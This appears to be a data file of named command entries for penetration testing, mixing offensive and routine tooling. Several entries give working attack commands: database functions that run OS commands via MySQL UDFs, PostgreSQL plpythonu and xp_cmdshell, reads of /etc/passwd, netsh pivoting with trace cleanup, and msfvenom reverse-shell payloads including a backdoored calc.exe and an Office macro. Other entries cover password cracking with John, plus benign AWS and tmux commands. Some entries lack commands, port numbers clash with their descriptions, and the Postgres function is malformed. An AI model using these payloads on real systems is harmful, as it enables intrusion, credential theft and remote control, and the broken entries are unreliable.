commands.Name: Export MySQL Table to File
commands.Description: Export a MySQL table's contents to a server-side file using SELECT INTO OUTFILE, creating a dump for exfiltration or local analysis in Linux priv-esc chains.

commands.Name: Execute MySQL Shell UDF
commands.Description: Load a custom UDF to execute OS shell commands via MySQL if file privileges allow, enabling arbitrary command execution post-database compromise.
commands.Command: CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'; SELECT sys_exec('whoami');

commands.Name: Load System File into MySQL
commands.Description: Ingest a system file like /etc/passwd into a MySQL table using LOAD DATA INFILE for enumeration of user accounts in escalated DB access.
commands.Command: LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table FIELDS TERMINATED BY ':';

commands.Name: Export MSSQL Table to File
commands.Description: Export MSSQL table data to a BCP file for offline analysis, leveraging xp_cmdshell or OPENROWSET to write dumps during cross-platform priv-esc.

commands.Name: Execute MSSQL Shell Command
commands.Description: Execute arbitrary OS commands on the MSSQL host using xp_cmdshell, bridging database access to system shell for Linux-like escalation from Windows.

commands.Name: Read System File into MSSQL
commands.Description: Incorporate Windows system files like SAM or hosts into MSSQL queries via OPENROWSET for credential or config enumeration in pivoted environments.

commands.Name: Copy Postgres Table to File
commands.Description: Copy a PostgreSQL table's data to a CSV file on the server using COPY command, enabling file-based exfiltration in Linux priv-esc ops.
commands.Command: COPY (SELECT * FROM table_name) TO '/tmp/dump.csv' WITH CSV HEADER;

commands.Name: Execute Postgres Shell Command
commands.Description: Execute system commands via a custom PL/Python function or extension in PostgreSQL, turning DB access into shell execution for escalation.
commands.Command: CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS text AS   import subprocess; return subprocess.check_output($1, shell=True)   LANGUAGE plpythonu; SELECT sys_exec('whoami');

commands.Name: Read System File in Postgres
commands.Description: Read a system file like /etc/passwd directly into PostgreSQL output using pg_read_file, requiring superuser perms for sensitive file enumeration in priv-esc.

commands.Description: Configure a Windows port proxy rule with netsh to forward traffic from local port 4545 to a remote host, supporting tunneling in post-exploitation from Linux pivots.
commands.Command: netsh interface portproxy add v4tov4 listenport=5656 listenaddress=192.169.179.65 connectport=5656 connectaddress=10.5.179.216

commands.Name: List Windows Port Proxies
commands.Description: Display all configured port proxy rules on Windows to verify forwarding setups during mixed Linux-Windows privilege escalation verification.

commands.Name: Add Windows Firewall Rule
commands.Description: Add an inbound Windows firewall rule to allow TCP traffic on port 4545, ensuring port forwards remain accessible in Linux-initiated lateral attacks.
commands.Command: netsh advfirewall firewall add rule name="port_forward_ssh_5656" protocol=TCP dir=in localip=192.169.179.65 localport=5656 action=allow

commands.Name: Delete Windows Firewall Rule
commands.Description: Remove a specific Windows firewall rule to clean up traces of port forwarding configurations after testing in a Linux priv-esc engagement.
commands.Command: netsh advfirewall firewall delete rule name="port_forward_ssh_5656"

commands.Name: Delete Windows Port Proxy
commands.Description: Delete a Windows port proxy rule to dismantle forwarding setups and maintain operational security post-Linux privilege escalation activities.
commands.Command: netsh interface portproxy del v4tov4 listenport=5656 listenaddress=192.169.179.65

commands.Name: List User Scheduled Tasks

commands.Name: Python Meterpreter Output Metasploit
commands.Description: Output a Python Meterpreter payload.
commands.Command: msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f py -o shell.py

commands.Name: VBA Macro Payload Metasploit
commands.Description: Create a VBA payload for Office macros.
commands.Command: msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f vba -o macro.vba

commands.Name: AES-Encrypted Payload Metasploit
commands.Description: Encrypt a payload with AES-256.
commands.Command: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 --encrypt aes256 -f exe -o secure.exe

commands.Name: Template Injection Payload Metasploit
commands.Description: Inject payload into calc.exe.
commands.Command: msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 --template calc.exe -f exe -o calc_backdoor.exe

commands.Name: Base64-Encoded Python Payload Metasploit
commands.Description: Encode a Python payload in Base64.
commands.Command: msfvenom -p python/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f py | base64

commands.Name: PowerShell Payload Execution Metasploit
commands.Description: Run a PowerShell payload
commands.Command: msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.1.1 LPORT=4444 -f psh | powershell -EncodedCommand

commands.Name: Linux Reverse Shell Metasploit
commands.Description: Generate a Linux reverse shell.
commands.Command: msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f elf -o shell.elf

commands.Name: Crack Linux Shadow File John
commands.Description: Targets SHA-512 hashed passwords in Linux shadow file.

commands.Name: Crack Windows NTLM Hashes John
commands.Description: Cracks NTLM hashes from Windows system dump.

commands.Name: Wordlist with Rules Cracking John
commands.Description: Applies mangling rules to rockyou.txt for MD5 hashes.

commands.Name: Brute-Force Mask Cracking John
commands.Description: Tries 4 lowercase letters and 2 digits for SHA-1.

commands.Name: Crack ZIP Archive Password John
commands.Description: Cracks ZIP archive password.

commands.Name: Crack PDF Password John
commands.Description: Cracks PDF document password.

commands.Name: Single Crack Mode John
commands.Description: Cracks weak passwords using username/GECOS data.

commands.Name: Show Cracked Passwords John
commands.Description: Displays cracked passwords from hashes.txt.

commands.Name: Restore Interrupted Session John
commands.Description: Resumes last interrupted session.

commands.Name: GPU Accelerated Cracking John
commands.Description: Uses GPU for faster SHA-512 cracking.

commands.Name: Crack Bcrypt Hashes John
commands.Description: Targets bcrypt hashes.

commands.Name: Custom Charset Cracking John
commands.Description: Uses custom charset for MD5 brute-forcing.

commands.Name: Multi-Process Cracking John
commands.Description: Runs 4 parallel processes for SHA-256 cracking.

commands.Name: Crack Specific Users John
commands.Description: Cracks passwords for root and admin.

commands.Name: Loopback Mode Cracking John
commands.Description: Reuses cracked passwords as wordlist for MD5.

commands.Name: Mask and Wordlist Cracking John
commands.Description: Appends two digits to wordlist entries for SHA-1.

commands.Name: Show Progress Every Minute John
commands.Description: Displays progress every 60 seconds.

commands.Name: External Mode Cracking John
commands.Description: Uses external filter for MD5 candidates.

commands.Name: Specific Encoding Cracking John
commands.Description: Uses UTF-8 encoding for wordlists.

commands.Name: Bcrypt Cost Range Cracking John
commands.Description: Targets bcrypt hashes with cost factors 10 to 12.

commands.Name: Create S3 Bucket and Upload File AWS
commands.Description: Creates a new S3 bucket and uploads a file, useful for testing bucket permissions and data exposure.
commands.Command: aws s3 mb s3://mybucket aws s3 cp localfile.txt s3://mybucket/

commands.Name: List All S3 Buckets AWS
commands.Description: Lists all S3 buckets in the account, helping identify misconfigured or publicly accessible buckets.

commands.Name: Download File from S3 AWS
commands.Description: Downloads a file from an S3 bucket, useful for verifying access controls.

commands.Name: Sync Local Directory with S3 Bucket AWS
commands.Description: Synchronizes a local directory with an S3 bucket, ideal for backing up data or testing sync permissions.

commands.Name: Launch EC2 Instance AWS
commands.Description: Launches a new EC2 instance, useful for setting up test environments or simulating attacker infrastructure.
commands.Command: aws ec2 run-instances --image-id ami-123 --count 1 --instance-type t2.micro --key-name MyKey --security-group-ids sg-123 --subnet-id subnet-123

commands.Name: Terminate EC2 Instance AWS
commands.Description: Terminates an EC2 instance, ensuring cleanup after testing to prevent unauthorized access.

commands.Name: Describe All EC2 Instances AWS
commands.Description: Lists all EC2 instances, helping identify running instances and their configurations.

commands.Name: Create Security Group and Add Rule AWS
commands.Description: Creates a security group and adds an SSH ingress rule, useful for testing network access controls.
commands.Command: aws ec2 create-security-group --group-name MySG --description "My SG" aws ec2 authorize-security-group-ingress --group-id sg-123 --protocol tcp --port 22 --cidr 0.0.0.0/0

commands.Name: Create IAM User and Attach Policy AWS
commands.Description: Creates an IAM user and grants S3 read-only access, ideal for testing least privilege principles.
commands.Command: aws iam create-user --user-name Bob aws iam attach-user-policy --user-name Bob --policy-arn arn:aws:iam::aws:policy/AmazonS3ReadOnlyAccess

commands.Name: List All IAM Users AWS
commands.Description: Lists all IAM users, helping identify unauthorized or dormant accounts.

commands.Name: Create Lambda Function AWS
commands.Description: Creates a Lambda function, useful for testing serverless application security.
commands.Command: aws lambda create-function --function-name MyFunction --runtime python3.8 --role arn:aws:iam::123456789012:role/lambda-role --handler lambda_function.lambda_handler --zip-file fileb://function.zip

commands.Name: Invoke Lambda Function AWS
commands.Description: Invokes a Lambda function, allowing testers to verify function behavior and outputs.

commands.Name: Create DynamoDB Table AWS
commands.Description: Creates a DynamoDB table, useful for testing data storage security.
commands.Command: aws dynamodb create-table --table-name MyTable --attribute-definitions AttributeName=Id,AttributeType=S --key-schema AttributeName=Id,KeyType=HASH --provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5

commands.Name: Insert Item into DynamoDB AWS
commands.Description: Inserts an item into a DynamoDB table, allowing testers to verify data access controls.

commands.Name: Get Item from DynamoDB AWS
commands.Description: Retrieves an item from a DynamoDB table, useful for testing read permissions.

commands.Name: Create CloudFormation Stack AWS
commands.Description: Creates a CloudFormation stack, ideal for deploying test infrastructure reproducibly.

commands.Name: Describe CloudFormation Stack AWS
commands.Description: Describes a CloudFormation stack, helping verify deployed resources.

commands.Name: Create RDS Database Instance AWS
commands.Description: Creates an RDS database instance, useful for testing database security configurations.
commands.Command: aws rds create-db-instance --db-instance-identifier MyDB --db-instance-class db.t2.micro --engine mysql --master-username admin --master-user-password password --allocated-storage 20

commands.Name: List All RDS Database Instances AWS
commands.Description: Lists all RDS instances, helping identify database configurations and potential vulnerabilities.

commands.Name: Set Up CloudWatch Alarm for EC2 Instance AWS
commands.Description: Sets up a CloudWatch alarm for CPU utilization on an EC2 instance.
commands.Command: aws cloudwatch put-metric-alarm --alarm-name CPUAlarm --metric-name CPUUtilization --namespace AWS/EC2 --statistic Average --period 300 --threshold 80 --comparison-operator GreaterThanThreshold --dimensions Name=InstanceId,Value=i-123 --evaluation-periods 2 --alarm-actions arn:aws:sns:us-east-1:123456789012:MyTopic

commands.Name: Start Tmux Session
commands.Description: Start a session.

commands.Name: Create Named Window in Tmux
commands.Description: create a window for vim, name it code with Ctrl-b ,.

commands.Name: Split Window in Tmux
commands.Description: split the window, running python manage.py runserver in the new pane.

commands.Name: Detach and Reconnect Tmux
commands.Description: detach and reconnect later with tmux attach-session -t dev.

commands.Name: Start Monitoring Session in Tmux
commands.Description: Start a session with tmux new-session -s monitor.

commands.Name: Split Horizontally in Tmux
commands.Description: split horizontally, running htop in the top pane and tail -f /var/log/syslog in the bottom.

commands.Name: See Pane Numbers in Tmux
commands.Description: see pane numbers and 1 to switch to the log pane.

commands.Name: Copy Error in Tmux
commands.Description: Copy an error with Ctrl-b [, select with Space and Enter, then paste into a file with Ctrl-b ].

commands.Name: Create Team Session in Tmux
commands.Description: Create a session with tmux new-session -s team.

commands.Name: Share Tmux Session
commands.Description: Share the session name and server details with a colleague, who attaches using tmux attach-session -t team.

commands.Name: Open Shared Editor Window in Tmux
commands.Description: open a window for a shared editor, and Ctrl-b f to find it later by name.
